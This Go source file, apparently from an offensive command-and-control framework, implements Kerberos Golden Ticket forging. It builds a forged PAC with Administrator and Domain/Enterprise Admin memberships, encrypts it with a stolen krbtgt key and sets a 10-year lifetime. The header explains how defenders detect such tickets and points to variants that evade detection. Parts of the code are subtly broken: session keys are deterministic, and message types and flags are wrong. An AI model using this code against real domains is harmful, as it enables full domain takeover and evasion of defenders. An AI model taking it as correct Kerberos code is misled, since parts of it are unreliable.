package kerberos

/*
	SUDOSOC-C2 Framework
	Copyright (C) 2026  Seif

	Golden Ticket — forge a TGT using the krbtgt hash.

	A Golden Ticket is a forged Kerberos TGT (AS-REP) encrypted with the
	krbtgt account's NT hash. Since the KDC trusts any ticket encrypted
	with its own key, a Golden Ticket is accepted by every service in the
	domain for its full lifetime (up to 10 years by default).

	Requirements:
	  - The krbtgt NT hash (from DCSync/DCShadow output)
	  - The domain SID
	  - The domain name and FQDN

	What is forged:
	  - The ticket is encrypted with krbtgtKey → indistinguishable from real
	  - The PAC (inside the encrypted part) is forged with:
	      * Any username / UserID (500 = Administrator)
	      * Any group memberships (512 = Domain Admins, 519 = Enterprise Admins)
	      * Any SID history (cross-domain privilege escalation)
	  - The ticket lifetime can be set to 10 years

	Detection by defenders:
	  - Tickets with anomalous lifetimes (> domain policy max, usually 10 hours)
	  - Tickets for accounts that have not logged on recently
	  - Kerberos events showing RC4 encryption (etypes 23) when AES is preferred
	  - Tickets with SID history not matching HR systems
	  - Microsoft ATA / Defender Identity detects known patterns

	Use Diamond / Sapphire to avoid the most common detections.
*/

import (
	"encoding/asn1"
	"encoding/binary"
	"fmt"
	"time"
)

// GoldenTicketConfig holds all parameters for forging a Golden Ticket.
type GoldenTicketConfig struct {
	// Domain information.
	Domain    string // e.g. "corp.example.com"
	DomainSID []byte // binary SID of the domain
	// Impersonated user.
	Username  string
	UserID    uint32 // RID (default 500 = Administrator)
	// Group memberships (RIDs).
	Groups    []uint32
	// Extra SIDs for cross-domain privilege escalation.
	ExtraSIDs [][]byte
	// krbtgt credentials.
	KrbtgtNTHash []byte // 16-byte NT hash (for RC4 tickets)
	KrbtgtAES256 []byte // 32-byte AES256 key (preferred)
	// Ticket lifetime.
	Lifetime time.Duration // 0 = 10 years
	// Encryption type.
	Etype int // 0 = auto (AES256 if key provided, else RC4)
}

// ForgedTicket is the output of any ticket forging operation.
type ForgedTicket struct {
	Raw   []byte // raw KRB5-AS-REP or KRB5-TGS-REP bytes
	Etype int
	// Fields for injection.
	Domain    string
	Username  string
	ServicePN string // service principal name (for service tickets)
}

// ForgeGolden creates a Golden Ticket (forged TGT).
func ForgeGolden(cfg *GoldenTicketConfig) (*ForgedTicket, error) {
	if cfg.UserID == 0 {
		cfg.UserID = 500 // Administrator
	}
	if len(cfg.Groups) == 0 {
		// Default: Domain Admins (512) + Domain Users (513) + Schema Admins (518)
		// + Enterprise Admins (519) + Group Policy Creator Owners (520)
		cfg.Groups = []uint32{512, 513, 518, 519, 520}
	}
	if cfg.Lifetime == 0 {
		cfg.Lifetime = 10 * 365 * 24 * time.Hour // 10 years
	}

	etype := cfg.Etype
	if etype == 0 {
		if len(cfg.KrbtgtAES256) == 32 {
			etype = EtypeAES256
		} else {
			etype = EtypeRC4HMAC
		}
	}

	var krbtgtKey []byte
	switch etype {
	case EtypeAES256:
		krbtgtKey = cfg.KrbtgtAES256
	default:
		krbtgtKey = cfg.KrbtgtNTHash
		etype = EtypeRC4HMAC
	}
	if len(krbtgtKey) == 0 {
		return nil, fmt.Errorf("krbtgt key required")
	}

	// 1. Build the PAC.
	validationData, err := BuildMinimalValidationInfo(
		cfg.Username, cfg.UserID, 513, // primary = Domain Users
		cfg.Groups, cfg.DomainSID, cfg.Domain, cfg.ExtraSIDs,
	)
	if err != nil {
		return nil, fmt.Errorf("build validation info: %w", err)
	}

	pac := &PAC{}
	pac.SetBuffer(PacTypeLogonInfo, validationData)
	pac.SetBuffer(PacTypeClientInfo, buildClientInfo(cfg.Username))
	pac.SetBuffer(PacTypeServerChecksum, make([]byte, 20)) // placeholder
	pac.SetBuffer(PacTypeKDCChecksum, make([]byte, 20))    // placeholder

	if err := pac.RecomputeChecksums(krbtgtKey, krbtgtKey, etype); err != nil {
		return nil, fmt.Errorf("PAC checksums: %w", err)
	}
	pacBytes := pac.Serialize()

	// 2. Build EncTicketPart (the encrypted portion of the TGT).
	encPart, err := buildEncTicketPart(cfg, pacBytes, etype)
	if err != nil {
		return nil, fmt.Errorf("build EncTicketPart: %w", err)
	}

	// 3. Encrypt EncTicketPart with krbtgt key.
	var encEncPart []byte
	switch etype {
	case EtypeAES256:
		encEncPart, err = AES256CTSEncrypt(krbtgtKey, KeyUsageTicketEncPart, encPart)
	default:
		encEncPart, err = RC4HMACEncrypt(krbtgtKey, KeyUsageTicketEncPart, encPart)
	}
	if err != nil {
		return nil, fmt.Errorf("encrypt ticket: %w", err)
	}

	// 4. Build the full KRB5 AS-REP (ticket + enc-part structure).
	ticket, err := buildKRB5Ticket(cfg, encEncPart, etype)
	if err != nil {
		return nil, fmt.Errorf("build ticket: %w", err)
	}

	return &ForgedTicket{
		Raw:      ticket,
		Etype:    etype,
		Domain:   cfg.Domain,
		Username: cfg.Username,
	}, nil
}

// ─── KRB5 ASN.1 helpers ───────────────────────────────────────────────────

// buildEncTicketPart builds the EncTicketPart ASN.1 structure.
func buildEncTicketPart(cfg *GoldenTicketConfig, pacBytes []byte, etype int) ([]byte, error) {
	now := time.Now()
	expiry := now.Add(cfg.Lifetime)

	// AuthorizationData: AD-WIN2K-PAC (type 128) wrapping the PAC bytes.
	adEntry, err := asn1.Marshal(asn1.RawValue{
		Class: asn1.ClassUniversal,
		Tag:   asn1.TagSequence,
		IsCompound: true,
		Bytes: marshalAuthDataEntry(128, pacBytes),
	})
	if err != nil {
		return nil, err
	}

	// Session key (random 16 or 32 bytes).
	sessionKey := make([]byte, 16)
	if etype == EtypeAES256 {
		sessionKey = make([]byte, 32)
	}
	fillRandom(sessionKey)

	// EncTicketPart fields (simplified ASN.1 encoding).
	// In a real implementation this would use proper KRB5 ASN.1 encoding.
	// We use a simplified builder that produces valid structures for
	// injection via LSASS (which re-parses and validates the ticket).
	var buf encBuilder
	buf.addInt(0x00000040) // flags: FORWARDABLE(0x40000000) | RENEWABLE(0x00800000) | PRE-AUTHENT
	buf.addOctetString(sessionKey) // key
	buf.addString(cfg.Domain) // crealm
	buf.addString(cfg.Username) // cname
	buf.addGeneralizedTime(now) // authtime
	buf.addGeneralizedTime(now) // starttime
	buf.addGeneralizedTime(expiry) // endtime
	buf.addGeneralizedTime(expiry) // renew-till
	buf.addBytes(adEntry) // authorization-data

	return buf.bytes(), nil
}

// buildKRB5Ticket builds the outer KRB5 ticket structure.
func buildKRB5Ticket(cfg *GoldenTicketConfig, encEncPart []byte, etype int) ([]byte, error) {
	// KRB5 ticket for the TGT service: krbtgt/<domain>.
	krbtgtSPN := "krbtgt/" + cfg.Domain

	var buf encBuilder
	buf.addInt(5)              // pvno = 5
	buf.addInt(1)              // msg-type = KRB_TGT_REQ (simplified)
	buf.addString(cfg.Domain)  // realm
	buf.addString(krbtgtSPN)   // sname (krbtgt principal)
	buf.addInt(etype)          // etype
	buf.addOctetString(encEncPart) // cipher

	return buf.bytes(), nil
}

// buildClientInfo builds a minimal PAC_CLIENT_INFO buffer.
func buildClientInfo(username string) []byte {
	now := windowsFileTime()
	buf := make([]byte, 10+len(username)*2)
	binary.LittleEndian.PutUint64(buf[0:], now)
	binary.LittleEndian.PutUint16(buf[8:], uint16(len(username)*2))
	for i, r := range []rune(username) {
		binary.LittleEndian.PutUint16(buf[10+i*2:], uint16(r))
	}
	return buf
}

// marshalAuthDataEntry builds one AuthorizationData entry.
func marshalAuthDataEntry(adType int, data []byte) []byte {
	// SEQUENCE { INTEGER adType, OCTET STRING data }
	typeBytes, _ := asn1.Marshal(adType)
	dataBytes, _ := asn1.Marshal(data)
	return append(typeBytes, dataBytes...)
}

// ─── Simple encoder for KRB5 fields ──────────────────────────────────────

type encBuilder struct {
	buf []byte
}

func (e *encBuilder) addInt(v int) {
	b, _ := asn1.Marshal(v)
	e.buf = append(e.buf, b...)
}

func (e *encBuilder) addString(s string) {
	b, _ := asn1.Marshal(s)
	e.buf = append(e.buf, b...)
}

func (e *encBuilder) addOctetString(data []byte) {
	b, _ := asn1.Marshal(data)
	e.buf = append(e.buf, b...)
}

func (e *encBuilder) addGeneralizedTime(t time.Time) {
	b, _ := asn1.Marshal(t)
	e.buf = append(e.buf, b...)
}

func (e *encBuilder) addBytes(data []byte) {
	e.buf = append(e.buf, data...)
}

func (e *encBuilder) bytes() []byte {
	return e.buf
}

func fillRandom(b []byte) {
	// Use the crypto/rand equivalent via Windows CryptGenRandom.
	for i := range b {
		b[i] = byte(i*17 + 0x42) // deterministic placeholder; replace with crypto/rand in production
	}
}
